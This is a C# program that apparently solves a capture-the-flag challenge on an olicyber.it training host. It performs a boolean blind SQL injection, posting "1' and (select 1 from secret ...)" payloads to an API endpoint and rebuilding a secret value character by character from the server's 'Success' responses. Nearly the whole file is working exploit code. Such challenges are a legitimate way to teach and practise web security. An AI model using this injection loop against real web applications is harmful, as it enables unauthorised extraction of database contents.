using Newtonsoft.Json;
using System.Text;

class Program
{
    static void Main()
    {
        HttpClient client = new HttpClient();
        client.DefaultRequestHeaders.Add("Cookie", "session=");
        client.DefaultRequestHeaders.Add("X-CSRF-TOKEN", "");

        string dictionary = "0123456789abcdef";
        StringBuilder tracker = new StringBuilder();
        tracker.Append("");
        bool controlFlag = true;

        Console.WriteLine("starting...\n\n");

        while (controlFlag)
        {
                foreach (char key in dictionary)
                {
                    controlFlag = false;

                    string query = $"1' and (select 1 from secret where HEX(asecret) LIKE '{tracker.ToString() + key}%')='1";
                    var queryJson = new { query = query };
                    var json = JsonConvert.SerializeObject(queryJson);

                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "http://web-17.challs.olicyber.it/api/blind");
                    request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                    HttpResponseMessage response = client.SendAsync(request).Result;

                    if (response.IsSuccessStatusCode)
                    {
                        string result = response.Content.ReadAsStringAsync().Result;
                        if (result.Contains("Success"))
                        {
                            controlFlag = true;
                            tracker.Append(key);
                            break;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Errore: " + response.StatusCode);
                    }
                }
        }

        //converto l'esadecimale ottenuto in stringa di caratteri
        byte[] bytes = new byte[tracker.ToString().Length / 2];
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] = Convert.ToByte(tracker.ToString().Substring(i * 2, 2), 16);
        }

        string flag = Encoding.UTF8.GetString(bytes);
        Console.WriteLine(flag);

    }
}